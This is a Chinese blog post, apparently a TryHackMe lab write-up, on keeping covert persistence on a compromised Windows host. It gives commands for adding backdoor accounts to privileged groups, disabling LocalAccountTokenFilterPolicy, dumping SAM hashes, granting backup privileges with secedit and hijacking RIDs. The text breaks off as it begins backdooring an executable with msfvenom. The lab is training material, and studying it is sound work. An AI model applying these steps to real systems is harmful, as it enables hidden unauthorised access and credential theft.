class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-Windows本地持久性</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-02-06T02:54:39.690Z" title="发表于 2024-02-06 10:54:39">2024-02-06</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-02-06T10:59:04.473Z" title="更新于 2024-02-06 18:59:04">2024-02-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">9.5k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>31分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-Windows本地持久性"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/02/06/thm-windows-ben-di-chi-jiu-xing/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/02/06/thm-windows-ben-di-chi-jiu-xing/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/02/06/thm-windows-ben-di-chi-jiu-xing/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-Windows本地持久性</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-02-06T02:54:39.690Z" title="发表于 2024-02-06 10:54:39">2024-02-06</time><time itemprop="dateCreated datePublished" datetime="2024-02-06T10:59:04.473Z" title="更新于 2024-02-06 18:59:04">2024-02-06</time></header><h1 id="0x01-简介">0x01 简介</h1>
<p>在目标的内部网络上获得第一个立足点后，您需要确保在真正获得皇冠上的宝石之前不会失去对它的访问权限。建立持久性是我们作为攻击者在获得网络访问权限时首先要做的任务之一。简而言之，持久性是指创建替代方法来重新获得对主机的访问权限，而无需再次经历利用阶段。</p>
<p>您希望尽快建立持久性的原因有很多，包括：</p>
<ul>
<li>重新利用并不总是可能的：一些不稳定的利用可能会在利用过程中杀死易受攻击的进程，让您对其中一些进程进行一次攻击。</li>
<li>获得立足点很难重现：例如，如果您使用网络钓鱼活动来获得第一次访问权限，那么重复它来重新获得对主机的访问权限简直就是太多的工作。您的第二次营销活动也可能不会那么有效，导致您无法访问网络。</li>
<li>蓝队正在追捕您：如果您的操作被检测到，用于获得您首次访问权限的任何漏洞都可能会被修补。您正在与时间赛跑！</li>
</ul>
<p>虽然您可以保留某些管理员的密码哈希并重新使用它来重新连接，但您总是面临这些凭据在某些时候被轮换的风险。另外，还有一些更狡猾的方法可以让您重新获得对受感染机器的访问权，从而使蓝队的日子变得更加艰难。</p>
<h1 id="0x02-本地持久性">0x02 本地持久性</h1>
<p>拥有管理员凭据将是在计算机中实现持久性的最简单方法。然而，为了让蓝队更难检测到我们，我们可以操纵非特权用户（这些用户通常不会像管理员那样受到监控），并以某种方式授予他们管理权限。</p>
<p>请注意，我们假设您已经以某种方式获得了管理访问权限，并尝试从那里建立持久性。</p>
<h2 id="21-篡改非特权账户">2.1 篡改非特权账户</h2>
<h3 id="分配组成员资格">分配组成员资格</h3>
<p>对于这部分任务，我们假设您已转储受害计算机的密码哈希值并成功破解了正在使用的非特权帐户的密码。</p>
<p>让非特权用户获得管理权限的直接方法是使其成为管理员组的一部分。我们可以使用以下命令轻松实现此目的：</p>
<pre><code class="hljs scss">C:\&gt; net localgroup administrators thmuser0 /add</code></pre>
<p>这将允许您使用 RDP、WinRM 或任何其他可用的远程管理服务来访问服务器。</p>
<p>如果这看起来太可疑，您可以使用备份操作员组。该组中的用户没有管理权限，但可以读取/写入系统上的任何文件或注册表项，忽略任何配置的 DACL。这将使我们能够复制 SAM 和 SYSTEM 注册表配置单元的内容，然后我们可以使用它们来恢复所有用户的密码哈希值，从而使我们能够轻松升级到任何管理帐户。</p>
<p>为此，我们首先将该帐户添加到 Backup Operators 组：</p>
<pre><code class="hljs scss">C:\&gt; net localgroup <span class="hljs-string">"Backup Operators"</span> thmuser1 /add</code></pre>
<p>由于这是一个非特权帐户，因此它无法通过 RDP 或 WinRM 返回计算机，除非我们将其添加到远程桌面用户 (RDP) 或远程管理用户 (WinRM) 组。我们将使用 WinRM 来完成此任务：</p>
<pre><code class="hljs scss">C:\&gt; net localgroup <span class="hljs-string">"Remote Management Users"</span> thmuser1 /add</code></pre>
<p>我们假设我们已经将凭据转储到服务器上并拥有 thmuser1 的密码。让我们使用其凭据通过 WinRM 进行连接：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206112013866.png" alt="image-20240206112013866"></p>
<p>如果您现在尝试从攻击者计算机进行连接，您会惊讶地发现，即使您位于 Backups Operators 组中，您也无法按预期访问所有文件。快速检查我们分配的组将表明我们是备份操作员的一部分，但该组已被禁用：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206112359025.png" alt="image-20240206112359025"></p>
<p>这是由于用户帐户控制 (UAC)。 UAC 实现的功能之一是 LocalAccountTokenFilterPolicy，它会在远程登录时剥夺任何本地帐户的管理权限。虽然您可以通过 UAC 从图形用户会话提升您的权限（请在此处阅读有关 UAC 的更多信息），但如果您使用 WinRM，则您将被限制为没有管理权限的有限访问令牌。</p>
<p>为了能够从您的用户那里重新获得管理权限，我们必须通过将以下注册表项更改为 1 来禁用 LocalAccountTokenFilterPolicy：</p>
<pre><code class="hljs scss">C:\&gt; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d <span class="hljs-number">1</span></code></pre>
<p>一旦所有这些都设置完毕，我们就可以使用我们的后门用户了。首先，让我们建立一个 WinRM 连接并检查是否为我们的用户启用了 Backup Operators 组：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206112520653.png" alt="image-20240206112520653"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206112604571.png" alt="image-20240206112604571"></p>
<p>然后我们继续备份 SAM 和 SYSTEM 文件并将它们下载到我们的攻击者计算机上：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206114707907.png" alt="image-20240206114707907"></p>
<p>注意：如果 Evil-WinRM 下载文件的时间过长，请随意使用任何其他传输方法。</p>
<p>有了这些文件，我们可以使用 <code>secretsdump.py</code> 或其他类似工具转储所有用户的密码哈希值：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206114956692.png" alt="image-20240206114956692"></p>
<p>最后，执行 Pass-the-Hash 以使用管理员权限连接到受害计算机：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206115157377.png" alt="image-20240206115157377"></p>
<h3 id="特殊权限和安全描述符">特殊权限和安全描述符</h3>
<p>无需修改任何组成员身份即可实现与将用户添加到 Backup Operators 组类似的结果。特殊组之所以特殊，是因为操作系统默认为它们分配了特定的权限。权限只是在系统本身上执行任务的能力。它们包括简单的事情，例如能够关闭服务器的能力，以及非常特权的操作，例如能够获得系统上任何文件的所有权。您可以在此处找到可用权限的完整列表以供参考：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">here</a></p>
<p>对于 Backup Operators 组，默认分配有以下两个权限：</p>
<ul>
<li>SeBackupPrivilege：用户可以读取系统中的任何文件，忽略任何 DACL。</li>
<li>SeRestorePrivilege：用户可以写入系统中的任何文件，忽略任何 DACL。</li>
</ul>
<p>我们可以将此类权限分配给任何用户，无论其组成员身份如何。为此，我们可以使用 <code>secedit</code> 命令。首先，我们将当前配置导出到临时文件：</p>
<pre><code class="hljs scss">secedit /export /cfg config<span class="hljs-selector-class">.inf</span></code></pre>
<p>我们打开文件并将用户添加到有关 SeBackupPrivilege 和 SeRestorePrivilege 的配置行中：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206121631766.png" alt="image-20240206121631766"></p>
<p>我们最终将 .inf 文件转换为 .sdb 文件，然后使用该文件将配置加载回系统中：</p>
<pre><code class="hljs scss">secedit /import /cfg config<span class="hljs-selector-class">.inf</span> /db config<span class="hljs-selector-class">.sdb</span>

secedit /configure /db config<span class="hljs-selector-class">.sdb</span> /cfg config<span class="hljs-selector-class">.inf</span></code></pre>
<p>您现在应该拥有一个与任何备份操作员具有同等权限的用户。用户仍然无法通过WinRM登录系统，所以让我们做点什么。我们不会将用户添加到远程管理用户组，而是更改与 WinRM 服务关联的安全描述符以允许 thmuser2 进行连接。将安全描述符视为 ACL，但应用于其他系统设施。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206121741944.png" alt="image-20240206121741944"></p>
<p>要打开 WinRM 安全描述符的配置窗口，您可以在 Powershell 中使用以下命令（为此，您需要使用 GUI 会话）：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Set-PSSessionConfiguration</span> <span class="hljs-literal">-Name</span> Microsoft.PowerShell <span class="hljs-literal">-showSecurityDescriptorUI</span></code></pre>
<p>这将打开一个窗口，您可以在其中添加 thmuser2 并为其分配连接到 WinRM 的完整权限：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206122549998.png" alt="image-20240206122549998"></p>
<p>完成此操作后，我们的用户就可以通过 WinRM 进行连接。由于用户具有 SeBackup 和 SeRestore 权限，因此我们可以重复这些步骤以从 SAM 恢复密码哈希并重新连接到管理员用户。</p>
<p>请注意，要使该用户完全使用给定的权限，您必须更改 LocalAccountTokenFilterPolicy 注册表项，但我们已经完成了此操作以获得先前的标志。</p>
<p>如果您检查用户的组成员身份，它看起来就像是普通用户。根本就没有什么可疑的地方！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206122732280.png" alt="image-20240206122732280"></p>
<p>我们再次假设我们已经将凭据转储到服务器上并拥有 thmuser2 的密码。让我们使用 WinRM 连接其凭据：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206123004806.png" alt="image-20240206123004806"></p>
<h3 id="rid劫持">RID劫持</h3>
<p>无需成为管理员即可获得管理权限的另一种方法是更改某些注册表值，使操作系统认为您是管理员。</p>
<p>创建用户时，会为其分配一个称为相对 ID (RID) 的标识符。 RID 只是代表系统中用户的数字标识符。当用户登录时，LSASS 进程从 SAM 注册表配置单元获取其 RID，并创建与该 RID 关联的访问令牌。如果我们可以篡改注册表值，我们可以通过将相同的 RID 关联到两个帐户，让 Windows 为非特权用户分配管理员访问令牌。</p>
<p>在任何 Windows 系统中，默认管理员帐户分配的 RID = 500，普通用户通常具有 RID &gt;= 1000。</p>
<p>要查找为任何用户分配的 RID，您可以使用以下命令：</p>
<pre><code class="hljs scss">wmic useraccount get name,sid</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206123741389.png" alt="image-20240206123741389"></p>
<p>RID 是 SID 的最后一位（thmuser3 为 1010，管理员为 500）。 SID 是一个标识符，允许操作系统跨域识别用户，但对于此任务，我们不会太在意它的其余部分。</p>
<p>现在我们只需将 RID=500 分配给 thmuser3。为此，我们需要使用 Regedit 访问 SAM。 SAM 仅限于 SYSTEM 帐户，因此即使是管理员也无法对其进行编辑。要以 SYSTEM 身份运行 Regedit，我们将使用 psexec，它可以在您的计算机中的 <code>C:\tools\pstools</code> 中找到：</p>
<pre><code class="hljs scss">C:\tools\pstools&gt; PsExec64.exe -i -s regedit</code></pre>
<p>从 Regedit 中，我们将转到 <code>HKLM\SAM\SAM\Domains\Account\Users\</code> ，其中计算机中的每个用户都有一个密钥。由于我们要修改 thmuser3，因此需要搜索其 RID 为十六进制的密钥 (1010 = 0x3F2)。在对应的key下，会有一个叫做F的值，它在0x30位置保存了用户的有效RID：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206123942505.png" alt="image-20240206123942505"></p>
<p>请注意，RID 使用小端表示法存储，因此其字节显示为反向。</p>
<p>现在，我们将用十六进制的管理员 RID 替换这两个字节 (500 = 0x01F4)，并交换字节 (F401)：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206124110217.png" alt="image-20240206124110217"></p>
<p>下次 thmuser3 登录时，LSASS 会将其与管理员相同的 RID 关联起来，并授予它们相同的权限。</p>
<p>对于此任务，我们假设您已经破坏了系统并获取了 thmuser3 的密码。为了您的方便，用户可以使用以下凭据通过 RDP 进行连接：</p>
<h2 id="22-后门文件">2.2 后门文件</h2>
<p>建立持久性的另一种方法包括篡改我们知道用户定期交互的一些文件。通过对这些文件进行一些修改，我们可以植入后门，每当用户访问它们时就会执行这些后门。由于我们不想创建任何可能暴露我们身份的警报，因此我们更改的文件必须继续按预期为用户工作。</p>
<p>虽然植入后门的机会有很多，但我们将检查最常用的后门。</p>
<h3 id="可执行文件">可执行文件</h3>
<p>如果您在桌面上发现任何可执行文件，则用户很可能会经常使用它。假设我们找到了 PuTTY 的快捷方式。如果我们检查快捷方式的属性，我们可以看到它（通常）指向 <code>C:\Program Files\PuTTY\putty.exe</code> 。从那时起，我们可以将可执行文件下载到攻击者的计算机上并修改它以运行我们想要的任何有效负载。</p>
<p>您可以使用 <code>msfvenom</code> 轻松地将您偏好的有效负载植入到任何 .exe 文件中。二进制文件仍将照常工作，但通过在二进制文件中添加额外的线程以静默方式执行额外的有效负载。要创建后门 putty.exe，我们可以使用以下命令：</p>
